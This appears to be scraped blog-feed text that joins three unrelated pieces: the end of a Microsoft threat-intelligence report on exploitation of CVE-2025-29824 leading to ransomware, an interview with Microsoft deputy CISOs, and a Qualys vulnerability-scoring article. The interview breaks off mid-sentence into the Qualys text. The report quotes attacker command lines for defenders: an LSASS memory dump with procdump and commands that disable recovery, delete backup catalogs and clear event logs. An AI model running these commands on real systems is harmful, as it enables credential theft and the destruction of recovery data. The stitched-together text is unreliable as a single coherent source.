&lt;p&gt;As part of the exploitation, a CLFS BLF file with the following path is created by the exploit’s &lt;em&gt;dllhost.exe&lt;/em&gt; process: &lt;em&gt;C:\ProgramData\SkyPDF\PDUDrv.blf&lt;/em&gt;. &lt;/p&gt;



&lt;h3 class="wp-block-heading" id="post-exploitation-activity-leads-to-ransomware-activity"&gt;Post-exploitation activity leads to ransomware activity&lt;/h3&gt;



&lt;p&gt;Upon successful exploitation, a payload is injected into &lt;em&gt;winlogon.exe. &lt;/em&gt;This payload then injected the Sysinternals &lt;a href="https://learn.microsoft.com/en-us/sysinternals/downloads/procdump#using-procdump"&gt;&lt;em&gt;procdump.exe&lt;/em&gt;&lt;/a&gt; tool into another &lt;em&gt;dllhost.exe &lt;/em&gt;and ran it with the following command line:&lt;/p&gt;


&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; quick-code: false; notranslate"&gt;
C:\Windows\system32\dllhost.exe -accepteula -r -ma lsass.exe c:\programdata\&amp;#x5b;random letters].
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Having done this, the actor was able to dump the memory of LSASS and parse it to obtain user credentials.&lt;/p&gt;



&lt;p&gt;Then, Microsoft observed ransomware activity on target systems. Files were encrypted and a random extension added, and a ransom note with the name &lt;em&gt;!_READ_ME_REXX2_!.txt&lt;/em&gt; was dropped. Microsoft is tracking activity associated with this ransomware as Storm-2460.&lt;/p&gt;



&lt;p&gt;Although we weren’t able to obtain a sample of ransomware for analysis, we’re including some notable events surrounding the activity to better help defenders:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Two .onion domains have been seen in the &lt;em&gt;!_READ_ME_REXX2_!.txt &lt;/em&gt;ransom notes&lt;ul&gt;&lt;li&gt;&lt;em&gt;jbdg4buq6jd7ed3rd6cynqtq5abttuekjnxqrqyvk4xam5i7ld33jvqd.onion&lt;/em&gt; which has been &lt;a href="https://www.ransomlook.io/group/ransomexx"&gt;tied to the RansomEXX ransomware&lt;/a&gt; family&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;uyhi3ypdkfeymyf5v35pbk3pz7st3zamsbjzf47jiqbcm3zmikpwf3qd.onion&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;The ransomware is launched from &lt;em&gt;dllhost.exe&lt;/em&gt; with the command line:&lt;/li&gt;
&lt;/ul&gt;


&lt;div class="wp-block-syntaxhighlighter-code "&gt;&lt;pre class="brush: plain; auto-links: false; gutter: false; title: ; notranslate"&gt;
--do &amp;#x5b;path_to_ransom] (for example, C:\Windows\system32\dllhost.exe --do C:\foobar)
&lt;/pre&gt;&lt;/div&gt;


&lt;ul class="wp-block-list"&gt;
&lt;li&gt;The file extension on the encrypted files is random per device, but the same for every file&lt;/li&gt;



&lt;li&gt;Some typical ransomware commands that make recovery or analysis harder are executed, including:&lt;ul&gt;&lt;li&gt;&lt;em&gt;bcdedit /set {default} recoveryenabled no&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;&lt;ul&gt;&lt;li&gt;&lt;em&gt;wbadmin delete catalog -quiet&lt;/em&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;em&gt;wevtutil cl Application&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;



&lt;li&gt;In one observed case the actor spawned &lt;em&gt;notepad.exe &lt;/em&gt;as SYSTEM&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="mitigation-and-protection-guidance"&gt;Mitigation and protection guidance&lt;/h2&gt;



&lt;p&gt;Microsoft released security updates to address CVE 2025-29824 on April 8, 2025. Customers running Windows 11, version 24H2 are not affected by the observed exploitation, even if the vulnerability was present. Microsoft urges customers to apply these updates as soon as possible.&lt;/p&gt;



&lt;p&gt;Microsoft recommends the following mitigations to reduce the impact of activity associated with Storm-2460:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Refer to our blog&amp;nbsp;&lt;a href="https://www.microsoft.com/security/blog/2022/05/09/ransomware-as-a-service-understanding-the-cybercrime-gig-economy-and-how-to-protect-yourself/#defending-against-ransomware"&gt;Ransomware as a service: Understanding the cybercrime gig economy&lt;/a&gt;&amp;nbsp;and how to protect yourself for robust measures to defend against ransomware.&lt;/li&gt;



&lt;li&gt;Turn on &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/configure-block-at-first-sight-microsoft-defender-antivirus" rel="noreferrer noopener" target="_blank"&gt;cloud-delivered protection&lt;/a&gt; in Microsoft Defender Antivirus or the equivalent for your antivirus product to cover rapidly evolving attacker tools and techniques. Cloud-based machine learning protections block a majority of new and unknown variants.&lt;/li&gt;



&lt;li&gt;Use&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/device-discovery?view=o365-worldwide"&gt;device discovery&lt;/a&gt;&amp;nbsp;to increase your visibility into your network by finding unmanaged devices on your network and onboarding them to Microsoft Defender for Endpoint. Ransomware attackers often identify unmanaged or legacy systems and use these blind spots to stage attacks.&lt;/li&gt;



&lt;li&gt;Run &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/edr-in-block-mode" rel="noreferrer noopener" target="_blank"&gt;EDR in block mode&lt;/a&gt;&amp;nbsp;so that Microsoft Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts that are detected post-breach.&lt;/li&gt;



&lt;li&gt;Enable &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/automated-investigations"&gt;investigation and remediation&lt;/a&gt; in full automated mode to allow Microsoft Defender for Endpoint to take immediate action on alerts to resolve breaches, significantly reducing alert volume. Use&amp;nbsp;&lt;a href="https://security.microsoft.com/vulnerabilities"&gt;Microsoft Defender Vulnerability Management&lt;/a&gt;&amp;nbsp;to assess your current status and deploy any updates that might have been missed.&lt;/li&gt;



&lt;li&gt;Microsoft 365 Defender customers can turn on &lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction" rel="noreferrer noopener" target="_blank"&gt;attack surface reduction rules&lt;/a&gt;&amp;nbsp;to prevent common attack techniques used in ransomware attacks:&lt;/li&gt;



&lt;li&gt;&lt;a href="https://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference#use-advanced-protection-against-ransomware" rel="noreferrer noopener" target="_blank"&gt;Use advanced protection against ransomware&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="microsoft-defender-xdr-detections"&gt;Microsoft Defender XDR detections&lt;/h2&gt;



&lt;p&gt;Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, apps to provide integrated protection against attacks like the threat discussed in this blog.&lt;/p&gt;



&lt;p&gt;Customers with provisioned access can also use &lt;a href="https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender"&gt;Microsoft Security Copilot in Microsoft Defender&lt;/a&gt; to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.&lt;/p&gt;



&lt;h3 class="wp-block-heading" id="microsoft-defender-antivirus"&gt;Microsoft Defender Antivirus&lt;/h3&gt;



&lt;p&gt;Microsoft Defender Antivirus detects threats associated with this activity as the following malware:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;SilverBasket (Win64/Windows)&lt;/li&gt;



&lt;li&gt;MSBuildInlineTaskLoader.C (Script/Windows)&lt;/li&gt;



&lt;li&gt;SuspClfsAccess (Win32/Windows)&lt;/li&gt;
&lt;/ul&gt;



&lt;h3 class="wp-block-heading" id="microsoft-defender-for-endpoint"&gt;Microsoft Defender for Endpoint&lt;/h3&gt;



&lt;p&gt;The following alerts might indicate threat activity related to this threat. Note, however, that these alerts can be also triggered by unrelated threat activity.&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A process was injected with potentially malicious code&lt;/li&gt;



&lt;li&gt;Potential Windows DLL process injection&lt;/li&gt;



&lt;li&gt;Suspicious access to LSASS service&lt;/li&gt;



&lt;li&gt;Sensitive credential memory read&lt;/li&gt;



&lt;li&gt;Suspicious process injection observed&lt;/li&gt;



&lt;li&gt;File backups were deleted&lt;/li&gt;



&lt;li&gt;Ransomware behavior detected in the file system&lt;/li&gt;
&lt;/ul&gt;



&lt;h2 class="wp-block-heading" id="microsoft-security-copilot"&gt;Microsoft Security Copilot&lt;/h2&gt;



&lt;p&gt;Security Copilot customers can use the standalone experience to &lt;a href="https://learn.microsoft.com/en-us/copilot/security/prompting-security-copilot#create-your-own-prompts"&gt;create their own prompts&lt;/a&gt; or run the following &lt;a href="https://learn.microsoft.com/en-us/copilot/security/using-promptbooks"&gt;pre-built promptbooks&lt;/a&gt; to automate incident response or investigation tasks related to this threat:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Incident investigation&lt;/li&gt;



&lt;li&gt;Microsoft User analysis&lt;/li&gt;



&lt;li&gt;Threat actor profile&lt;/li&gt;



&lt;li&gt;Threat Intelligence 360 report based on MDTI article&lt;/li&gt;



&lt;li&gt;Vulnerability impact assessment&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Note that some promptbooks require access to plugins for Microsoft products such as Microsoft Defender XDR or Microsoft Sentinel.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="hunting-queries"&gt;Hunting queries&lt;/h2&gt;



&lt;h3 class="wp-block-heading" id="microsoft-sentinel"&gt;Microsoft Sentinel&lt;/h3&gt;



&lt;p&gt;Microsoft Sentinel customers can use the TI Mapping analytics (a series of analytics all prefixed with ‘TI map’) to automatically match the malicious domain indicators mentioned in this blog post with data in their workspace. If the TI Map analytics are not currently deployed, customers can install the Threat Intelligence solution from the &lt;a href="https://learn.microsoft.com/azure/sentinel/sentinel-solutions-deploy"&gt;Microsoft Sentinel Content Hub&lt;/a&gt; to have the analytics rule deployed in their Sentinel workspace.&lt;/p&gt;

&lt;p&gt;The post &lt;a href="https://www.microsoft.com/en-us/security/blog/2025/04/08/meet-the-deputy-cisos-who-help-shape-microsofts-approach-to-cybersecurity/"&gt;Meet the Deputy CISOs who help shape Microsoft’s approach to cybersecurity&lt;/a&gt; appeared first on &lt;a href="https://www.microsoft.com/en-us/security/blog"&gt;Microsoft Security Blog&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;Microsoft launched its &lt;a href="https://www.microsoft.com/trust-center/security/secure-future-initiative"&gt;Cybersecurity Governance Council in 2024&lt;/a&gt;, and with it, named a group of deputy chief information security officers that ensure comprehensive oversight of the company&amp;#8217;s cybersecurity risk, defense, and compliance. These leaders work in tandem with product and engineering leaders across the company to create accountability and advance cybersecurity protection for Microsoft, our customers, and the industry.&lt;/p&gt;



&lt;p&gt;In this series, we will introduce these leaders and share more about their background, their role, and their priorities.&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="Microsoft’s Deputy Chief Information Officers from top to bottom: Yonatan Zunger, CVP and Deputy Chief Information Security Officer, Artificial Intelligence, Igor Sakhov, CVP and Deputy Chief Information Security Officer, Identity, and Mark Russinovich, Technical Fellow, Azure Chief Technology Officer and Deputy Chief Information Security Officer, Azure." class="wp-image-138270" height="326" src="https://www.microsoft.com/en-us/security/blog/wp-content/uploads/2025/04/Picture1.jpg" width="732" /&gt;&lt;/figure&gt;



&lt;h2 class="wp-block-heading" id="q-tell-us-about-your-current-role-and-responsibilities"&gt;Q: Tell us about your current role and responsibilities.&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “As Microsoft’s Corporate Vice President of Engineering for Identity, I lead data and platform engineering along with business-facing initiatives. Since April 2024, I’ve also served as Deputy Chief Information Security Officer (CISO) focusing on identity-related security risks.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: “In my role, I work with a large team to identify and resolve the security risks that come up and evolve under the &lt;a href="https://azure.microsoft.com" rel="noreferrer noopener" target="_blank"&gt;Microsoft Azure&lt;/a&gt; umbrella, the core operating system itself, and the groups that make up the core engineering systems that the entire company depends on. In all these cases, we want the risk mitigations to be durable so once they&amp;#8217;re done, the system stays secure and doesn&amp;#8217;t have to be revisited every year.&amp;#8221; &lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “My job is to try and think about all the different ways in which things involving AI can go wrong, make sure that we have good, thoughtful plans for each of those things, and develop the right tools so we can design and run the right incident response for AI issues.”&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="q-how-did-you-get-your-start-in-cybersecurity"&gt;Q: How did you get your start in cybersecurity?&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “It didn’t really start in cybersecurity. My journey began with a deep interest in understanding how systems work and how they interact and perform at scale. Inevitably, the hard question of security surfaces and the interesting aspects of detection and prevention become top of mind.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: &amp;#8220;I&amp;#8217;ve always been interested in the way computers and operating systems work. In junior high I started working with computers and figuring out the internals, then went to college and graduate school in it. There was a natural intersection with cybersecurity and operating systems design since both involve understanding complex systems, and I started doing more with cybersecurity.&amp;#8221;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “I started my career as a theoretical physicist. I joined Google, spent years building search and infrastructure, and in 2011 I became the Chief Technology Officer of social. This was a few months before the launch of Google Plus, and I discovered that the hard parts of the job had nothing to do with technology. Instead, all the hard parts were security and privacy, and those were interesting problems to me. It quickly became clear that using these technologies in the right or wrong way can have a huge impact on people’s lives. That stuck with me, and it caused me to genuinely fall in love with the field.”&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="q-what-does-your-team-do-and-how-do-you-work-with-others-across-the-company"&gt;Q: What does your team do, and how do you work with others across the company?&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “My team is responsible for the work and innovation in the Identity space, building a large-scale enterprise identity system. Over the past year, the point about larger systems being identity-driven has really come to fruition, with the new efforts that leverage identity in the network flows.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: &amp;#8220;My team focuses on technical strategy, architecture, and security risk management for the Azure platform, engineering systems, and core operating systems. We work closely with teams across Microsoft to implement durable security measures. I collaborate with emerging technology teams to understand customer requirements and guide Azure&amp;#8217;s development while ensuring security remains a priority in all decisions and implementations.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “We&amp;#8217;re a very horizontal team and our work has six core pillars: AI research, infrastructure, empowerment, evaluation and review, &lt;a href="https://www.microsoft.com/security/business/microsoft-incident-response"&gt;incident response&lt;/a&gt;, and policy and engagement. Within those pillars are a lot of people working on a lot of things, from doing safety and teaching it to people, to thoroughly testing and vetting every piece of generative AI software that goes out the door at Microsoft, to bringing AI expertise into incident responses, to engaging with all sorts of stakeholders across the world, and talking and sharing with them but also listening and learning.”&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="q-how-do-you-balance-the-need-for-security-with-the-need-for-innovation-in-your-team"&gt;Q: How do you balance the need for security with the need for innovation in your team?&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “Balancing is important and hard. We strive to integrate security into the development process from the outset, shifting left and avoiding interruptions. No matter how innovative the product is, it will not get adapted if it is not secure or not reliable.”&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: &amp;#8220;I don&amp;#8217;t think it&amp;#8217;s an either or, but it is a balance. The second something may turn into a widget or service that people will depend on, you need security, but if you create such a hardened system that no one can use it, you&amp;#8217;ve wasted time. We have a commitment to our customers that security is always in the driver&amp;#8217;s seat, but innovation is holding the road map, and we&amp;#8217;re delivering on that.&amp;#8221;&lt;br /&gt;&lt;br /&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “Engineering is the art of building systems to solve problems. If you’re building a system that isn’t safe and secure, you aren’t solving the customer’s problem, you&amp;#8217;re building a system that will give them more problems.”&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="q-what-are-some-of-the-biggest-cybersecurity-misconceptions-that-you-encounter"&gt;Q: What are some of the biggest cybersecurity misconceptions that you encounter?&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “The desire to make the perfect solution. This is why ‘assume breach’ is the mindset I cultivated with my team. Yes, we must focus on the protection at all costs, and we should expect that any protection will be circumvented. How we detect, reduce the impact, and mitigate in the shortest time is top of mind.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: &amp;#8220;The assumption that unless you can prove to me something is not secure, it&amp;#8217;s secure. You of course must invest in prevention, but Microsoft has said for close to a decade now that you have to assume any system can and will be breached, so you have to minimize the impact and increase how you detect and mitigate those breaches.&amp;#8221;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “The idea that security, privacy, and safety are three distinct things. They’re not. If you’ve ever seen a security team, say, ‘That sounds like a privacy problem,’ and a privacy team say, ‘That sounds like a security problem,’ and nobody fixes it, you know where this story ends. Artificial boundaries like these are a factory of nasty incidents.”&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="q-what-s-one-piece-of-advice-you-would-give-to-your-younger-self"&gt;Q: What’s one piece of advice you would give to your younger self?&lt;/h2&gt;



&lt;p&gt;&lt;strong&gt;Igor Sakhnov&lt;/strong&gt;: “Shift focus from the local improvements and invest heavily into the influence to shift larger organization for all to move in the needed direction. &lt;a href="https://www.microsoft.com/en-us/trust-center/security/secure-future-initiative"&gt;Microsoft’s Secure Future Initiative&lt;/a&gt; is a notable example where a central push supersedes all the local innovation we have done over the years.”&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Mark Russinovich&lt;/strong&gt;: &amp;#8220;I don&amp;#8217;t look back and think about things that I&amp;#8217;ve done wrong, but for those that are just starting out in a career or in life, I&amp;#8217;d say this: When you find an area that you&amp;#8217;re passionate about, learn that area and the areas around it, and learn one level deeper than you think necessary to be effective. My father gave me that advice and it&amp;#8217;s what inspired me to pursue computers.&amp;#8221;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Yonatan Zunger&lt;/strong&gt;: “If you ever find yourself in a relationship where you can’t fully be yourself&amp;#8230;leave.”&lt;/p&gt;

&lt;p&gt;Across identity, cloud ecosystems, and privacy, these leaders have independently arrived at similar conclusions: security enables rather than restricts, perfect protection is impossible, but resilience is achievable, and everyone—from engineers to customers—plays a role in defense.&lt;/p&gt;



&lt;p&gt;Microsoft&amp;#8217;s security transformation isn&amp;#8217;t just about technology.

While these methods help assess whether a specific vulnerability exists on an asset and define its severity, traditional frameworks like CVSS often overlook the likelihood of exploitation. While EPSS and CISA KEV provide more direct insight into the likelihood of exploitation, many programs still rely heavily on severity scores alone, which can leave gaps in understanding the true risk. This oversight can hinder organizations from making fully informed decisions about managing risk for their business and digital assets.&lt;/p&gt;



&lt;p&gt;To bridge this gap, Qualys Vulnerability Score (QVS) and Qualys Detection Score (QDS), key components of &lt;a href="https://www.qualys.com/enterprise-trurisk-platform/"&gt;Qualys TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt;&lt;/a&gt;, leverage over 25 sources of threat intelligence to measure the likelihood of vulnerability exploitation. While other methods may only capture part of the picture or require additional calculations, we aggregate and analyze this data automatically through one comprehensive solution. Our continuously updated scores provide cybersecurity teams with confidence in their assessments, give remediation owners assurance that their efforts are making a measurable impact, and offer business stakeholders certainty that risk management strategies are effectively reducing organizational exposure.&lt;/p&gt;



&lt;p&gt;This blog is the second installment in the &lt;a href="https://blog.qualys.com/product-tech/2024/12/18/steps-to-trurisk-insight-to-action-with-vmdr"&gt;five-part Steps to TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; series&lt;/a&gt; on operationalizing a risk-based vulnerability management program with Qualys TruRisk. In this post, we explore why adopting such a system is essential for driving meaningful risk reduction.&lt;/p&gt;

&lt;h2 class="wp-block-heading" id="victory-belongs-to-the-well-informed"&gt;Victory Belongs to the Well-Informed&lt;/h2&gt;



&lt;p&gt;Success in any battle, whether on the battlefield or in cybersecurity, depends on more than sheer strength. It requires intelligence, strategic insights, and the ability to act on the right information at the right time. Leaders throughout history have turned to covert networks to uncover critical information, disrupt enemy plans, and anticipate the next move. One of the most striking examples comes from the American Revolution, where intelligence networks provided critical insights that helped shape strategic decisions.&lt;/p&gt;



&lt;p&gt;In 1775, thirteen American colonies stood on the brink of Revolutionary war against the most powerful military and colonial force in the world. Victory would demand more than sheer firepower, it would require intelligence, grit, and relentless innovation.&lt;/p&gt;



&lt;p&gt;During the war, George Washington relied on an intelligence network to track enemy movements and gain a strategic edge—proving that timely, accurate insights can turn the tide of conflict. He authorized the Culper Ring, a covert intelligence network operating behind enemy lines. Its members risked their lives to gather and relay critical information, using coded messages, dead drops, and invisible ink to evade detection. Their intelligence shaped key strategic decisions, exposing threats, disrupting enemy plans, and keeping the Continental Army ahead of its adversaries. Victory in war was not won by force alone, but through precision, deception, and the mastery of strategy.&lt;/p&gt;

&lt;p class="has-text-align-center"&gt;&lt;strong&gt;&lt;em&gt;The necessity of procuring good Intelligence is apparent and need not be further urged. &lt;/em&gt;&lt;/strong&gt;&lt;br /&gt;&lt;strong&gt;&lt;em&gt;– George Washington&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This same principle applies to cybersecurity today. Organizations are constantly under siege by evolving cyber threats. But the challenge isn’t just about fending off attacks, it’s about knowing where to focus. With thousands of vulnerabilities and alerts flooding security teams daily, the real struggle is identifying which risks matter most and require immediate action.&lt;/p&gt;



&lt;p&gt;By delivering clear, contextualized risk intelligence, Qualys TruRisk helps businesses cut through the noise, prioritize the most pressing threats, and allocate resources effectively. Just as intelligence networks shaped the outcomes of historic conflicts, actionable cybersecurity insights can mean the difference between a reactive defense and a proactive, strategic advantage.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="defining-the-components-of-likelihood-of-exploit"&gt;Defining the Components of Likelihood of Exploit&lt;/h2&gt;



&lt;p&gt;The likelihood of vulnerability exploitation is a key part of the risk equation, expressed as &lt;strong&gt;Risk = Likelihood × Impact&lt;/strong&gt;. Likelihood itself is determined by &lt;strong&gt;Threat × Vulnerability&lt;/strong&gt;. &lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;A vulnerability is a weakness in a system or process that could be exploited by a threat.&lt;/li&gt;



&lt;li&gt;A threat is any action or event that could adversely affect that system or process.&lt;/li&gt;



&lt;li&gt;Exploitation occurs when an attacker takes advantage of a vulnerability.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;For risk to exist, a vulnerability must have a corresponding threat that can exploit it. If a vulnerability exists but is not actively exploited and no known proof of concept is available, then the likelihood of exploitation is very low. Conversely, if a credible threat exists but the vulnerability has been patched, the likelihood of exploitation is effectively zero.&lt;/p&gt;



&lt;p&gt;To truly manage risk, it&amp;#8217;s important to understand how the likelihood of exploitation works. Think of it like this: a vulnerability is like an unlocked door, and a threat is someone who knows how to walk through it. But for risk to become real, there needs to be a perfect storm—an active threat ready to exploit that open door. If the door’s locked, even the most skilled intruder can’t get through. By assessing both vulnerabilities and active threats, organizations can focus on the risks that matter most. A well-informed approach ensures that resources are allocated efficiently, reducing exposure to real-world attacks while avoiding unnecessary panic over theoretical risks.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="the-role-of-cvss-epss-and-cisa-kev-in-risk-assessment"&gt;The Role of CVSS, EPSS, and CISA KEV in Risk Assessment&lt;/h2&gt;



&lt;p&gt;CVSS is the industry standard for measuring the severity of a vulnerability. However, CVSS lacks organizational context. It quantifies how dangerous a vulnerability could be, but not how dangerous it actually is to a specific organization. It does not consider security controls in place, the criticality of the affected asset, or environmental factors that may impact risk. Additionally, CVSS temporal metrics, which attempt to account for exploit code maturity, are not updated consistently, making them unreliable for dynamic risk assessment.&lt;/p&gt;



&lt;p&gt;One challenge with CVSS is that over half of all vulnerabilities are categorized as Critical or High. Another challenge is that out of the full breadth of CVEs listed in the NVD, only about 3 to 4 percent contribute to the highest risk. These include vulnerabilities with active exploits, inclusion in the CISA KEV catalog, exploitation by malware or ransomware, use by threat actors, or widespread recognition, often called celebrity vulnerabilities. Without additional context, organizations struggle to determine which vulnerabilities should be prioritized. If everything is labeled critical, then nothing truly is, leading to inefficiencies in remediation efforts.&lt;/p&gt;



&lt;p&gt;To address this, EPSS and CISA KEV focus on the likelihood of exploitation, providing valuable insight into which vulnerabilities pose the most immediate risk. However, these models do not factor in severity as defined by CVSS, meaning they must be used alongside other assessments to provide a complete risk picture.&lt;/p&gt;



&lt;p&gt;Given the overwhelming number of vulnerabilities and limited remediation resources, organizations need a risk-based approach that incorporates both severity and likelihood while also factoring in asset context. While CVSS does provide mechanisms for integrating temporal and environmental factors, applying these consistently can be complex and time-consuming, requiring additional effort to define and maintain reliable metrics.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="the-case-for-context-why-meaningful-remediation-is-critical"&gt;The Case for Context: Why Meaningful Remediation is Critical&lt;/h2&gt;



&lt;p&gt;One point of contention between IT and Cybersecurity is that the IT teams perceive that the Cybersecurity team which is going through and identifying a volume of vulnerabilities is not looking deeper into the how likely the vulnerability is to be an actual problem. IT teams often feel that they are being asked to remediate issues simply because a vulnerability appears technically severe under certain conditions—even when there is no proof of concept or active exploitation. This disconnect can create frustration, as teams struggle to prioritize meaningful security efforts over theoretical risks.&lt;/p&gt;



&lt;p&gt;It is better if the IT teams know that their contributions for risk reduction highly matter to the organization and are a vital part of the business strategy. That they are truly helping defend the organization against a vulnerability that pose a legitimate threat, instead of digging the proverbial ditch that devolves into what feels like busywork by reducing a never-ending tumult of volumetrics that doesn’t really move the needle of risk in an organization. This deteriorates the credibility of the Cybersecurity team, and it leaves the IT teams doing work that feels devoid of meaning.&lt;/p&gt;



&lt;p&gt;Restoring trust between IT and Cybersecurity starts with focusing on real threats. To shift from high-volume remediation to high-impact action, teams need risk context. This is where QVS and QDS become a game changer. QVS scores vulnerabilities by their likelihood of exploitation, while QDS applies that insight at the asset level—factoring in compensating controls to show true risk. Together, they provide a new kind of clarity to the teams and help them move from reactive remediation to strategic risk reduction.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="qualys-vulnerability-score-qvs-a-unified-measure-of-exploitability"&gt;Qualys Vulnerability Score (QVS): A Unified Measure of Exploitability&lt;/h2&gt;



&lt;p&gt;The Qualys Vulnerability Score (QVS) quantifies the likelihood of exploitation by consolidating all threat intelligence associated with a CVE into a single score. The risk factors that contribute to each QVS score provide clear evidence to stakeholders, making it easier to understand the risk associated with a vulnerability.&lt;/p&gt;



&lt;p&gt;QVS is derived from two key factors:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;Technical Details&lt;/strong&gt; (CVSS score)&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Temporal Details&lt;/strong&gt; (External threat intelligence, exploit code maturity and trending data)&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;Qualys calculates a QVS for every vulnerability in the National Vulnerability Database (NVD), whether or not a Qualys detection has been built for it. This serves two purposes:&lt;/p&gt;



&lt;ol class="wp-block-list"&gt;
&lt;li&gt;The score is ready for when a Qualys detection is delivered to the platform.&lt;/li&gt;



&lt;li&gt;It enables Enterprise TruRisk Management (ETM) customers to measure the likelihood of exploit for vulnerabilities imported from other vulnerability detection tools that standardize at the CVE level.&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;This approach leads to a more comprehensive measure of risk across assets, helping organizations strengthen their cybersecurity posture.&lt;/p&gt;



&lt;h2 class="wp-block-heading" id="qualys-detection-score-qds-operationalizing-risk"&gt;Qualys Detection Score (QDS): Operationalizing Risk&lt;/h2&gt;



&lt;p&gt;For VMDR, the Qualys Detection Score (QDS) is derived from the highest Qualys Vulnerability Score (QVS) among any associated CVEs. When multiple CVEs contribute to a QID, the CVE with the highest CVSS score is used in the QDS calculation.&lt;/p&gt;



&lt;p&gt;QDS is derived from two factors:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;&lt;strong&gt;The highest QVS of all associated CVEs&lt;/strong&gt;&lt;/li&gt;



&lt;li&gt;&lt;strong&gt;Compensating Controls&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;To learn more, explore &amp;#8216;Understanding Qualys Detection Scores&amp;#8217; in our &lt;a href="https://docs.qualys.com/en/etm/1.0.0/appendix/calculating_true_risk_score.htm"&gt;TruRisk&lt;img alt="™" class="wp-smiley" src="https://s.w.org/images/core/emoji/15.0.3/72x72/2122.png" style="height: 1em;" /&gt; documentation&lt;/a&gt;, which includes a table listing the factors present at each QDS level.&lt;/p&gt;



&lt;p&gt;QDS values assigned to vulnerabilities are also applied to web assets with Total Application Security (TAS), Container workloads in Container Security (CS), and are reflected on assets in Global AssetView/Cybersecurity Asset Management that are entitled for VMDR.&lt;/p&gt;



